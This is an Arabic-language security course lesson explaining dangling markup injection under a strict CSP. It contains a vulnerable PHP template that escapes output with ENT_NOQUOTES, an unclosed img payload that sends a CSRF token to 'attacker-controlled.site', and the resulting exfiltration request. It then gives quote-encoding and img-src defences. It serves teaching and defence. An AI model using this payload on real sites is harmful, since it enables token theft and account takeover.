# 05 - ثغرات حقن العلامات العالقة وسرقة الرموز دون جافا سكريبت (Dangling Markup)

> 🌐 **Language / اللغة:** [English 🇬🇧](../en/05-dangling-markup-injection.md) | [العربية 🇸🇦](./05-dangling-markup-injection.md)

---

## 📌 1. السيناريو: ماذا لو كانت جافا سكريبت محظورة 100%؟

تخيل تطبيقاً محمياً بسياسة أمان محتوى بالغة الصرامة (**Content Security Policy - CSP**):
```http
Content-Security-Policy: default-src 'self'; script-src 'none';
```
أي محاولة لحقن وسم `<script>` أو معالجات الأحداث التلقائية (`onerror=alert(1)`) أو روابط `javascript:` ستُحظر فوراً بواسطة المتصفح.

يعتقد أغلب المطورين في هذه الحالة أن التطبيق في مأمن تام من أي هجمات في المتصفح. **وهذا خطأ فادح.**

مرحباً بك في هجمات **حقن العلامات العالقة (Dangling Markup Injection)**—أحد أذكى الهجمات التي تستخرج رموز الحماية السرية (CSRF Tokens) وكلمات المرور باستخدام مجرد **وسم HTML غير مغلق!**

---

## ⚔️ 2. آلية تنفيذ الهجوم (Attack Mechanism)

### القالب البرمجي المصاب في السيرفر:
افترض صفحة ملف شخصي تطبع الاسم الأول للمستخدم، ويلي ذلك مباشرة حقل مخفي يحتوي على رمز حماية سري (CSRF Token):

```html
<p>مرحباً بك مجدداً، <?= htmlspecialchars($firstName, ENT_NOQUOTES) ?>!</p>

<form action="/account/delete" method="POST">
    <input type="hidden" name="csrf_token" value="9f8a3c2e1b4d5e6f7a8b9c0d1e2f3a4b">
    <button type="submit">حذف الحساب نهائياً</button>
</form>
```

### الحمولة المحقونة غير المكتملة (Dangling Payload):
يقوم المهاجم بتغيير اسمه الأول إلى وسم صورة يبدأ بعلامة تنصيص مفردة دون إغلاقها:
```html
<img src='https://attacker-controlled.site/log?data=
```

### كيف يفسر المتصفح شجرة الـ DOM الناتجة؟
نظراً لغياب علامة التنصيص المفردة الختامية `'`، يعامل محرك المتصفح **كل ما يأتي بعد نقطة الحقن على أنه جزء من رابط الصورة `src`** حتى يصادف أول علامة تنصيص مفردة لاحقة في الصفحة:

```html
<p>مرحباً بك مجدداً، <img src='https://attacker-controlled.site/log?data=!</p>

<form action="/account/delete" method="POST">
    <input type="hidden" name="csrf_token" value="9f8a3c2e1b4d5e6f7a8b9c0d1e2f3a4b">
    <button type="submit">حذف الحساب نهائياً</button>
</form>'></p>
```

### طلب الـ HTTP الخبيث الصادر من متصفح الضحية:
يحاول المتصفح تحميل الصورة فيرسل طلب HTTP GET تلقائياً إلى سيرفر المهاجم:
```http
GET /log?data=!%3C/p%3E%3Cform%20action=%22/account/delete%22%20method=%22POST%22%3E%3Cinput%20type=%22hidden%22%20name=%22csrf_token%22%20value=%229f8a3c2e1b4d5e6f7a8b9c0d1e2f3a4b%22 HTTP/1.1
Host: attacker-controlled.site
```
يفتح المهاجم سجلات السيرفر (Access Logs)، ويجد رمز الـ CSRF السري للمستخدم مطبوعاً بوضوح داخل الرابط، فيقوم باستخدامه للسيطرة على حساب الضحية فوراً—**دون تشغيل سطر واحد من كود جافا سكريبت!**

---

## 🛡️ 3. كيفية سد ثغرة Dangling Markup وحماية الموقع

### خط الدفاع 1: الترميز الدقيق لعلامات التنصيص (Contextual Entity Encoding)
لا تطبع أي مدخلات دون تشفير علامات التنصيص:
```php
// كود آمن: يشفر علامات التنصيص المفردة والمزدوجة إلى كيانات HTML (&quot; و &#039;)
echo htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

### خط الدفاع 2: تقييد مصادر جلب الصور في سياسة الـ CSP
امنع المتصفح من إرسال طلبات صور أو وسائط إلى نطاقات خارجية عشوائية:
```http
Content-Security-Policy: default-src 'self'; img-src 'self';
```
إذا حقن المهاجم وسم صورة يشير إلى نطاقه الخارجي، يرفض المتصفح إرسال الطلب فوراً لكون النطاق غير مصرح به في الـ CSP!

---

## 🎯 ملخص وتحدي الدرس

- تبتلع العلامات العالقة نصوص الـ HTML التالية لنقطة الحقن داخل خاصية غير مغلقة.
- تنجح في سرقة رموز CSRF الحساسة حتى في بيئات الـ CSP الصارمة الخالية من جافا سكريبت.
- سد الثغرة يعتمد على تشفير التنصيص عبر `ENT_QUOTES` وتقييد `img-src` في الـ CSP.

**تحدي الدرس:** في **[المختبر 1 التوجيهي المشروح](../Labs/Lab-1-Guided-Walkthrough/README.ar.md)**، ستفحص تطبيقاً حقيقياً مصاباً بهذه الثغرة، وتقوم باختبار استخراج الرمز وتطبيق كود الترقيع الدفاعي بيدك!

---

**الدرس التالي:**  
➡️ [الدرس 06: تسريب البيانات الحساسة عبر محددات CSS الخالصة](./06-css-data-exfiltration.md) | ⬅️ [الدرس 04: عزل نوافذ Iframe وحماية التطبيقات من هجمات Clickjacking](./04-iframe-sandboxing-and-clickjacking.md)
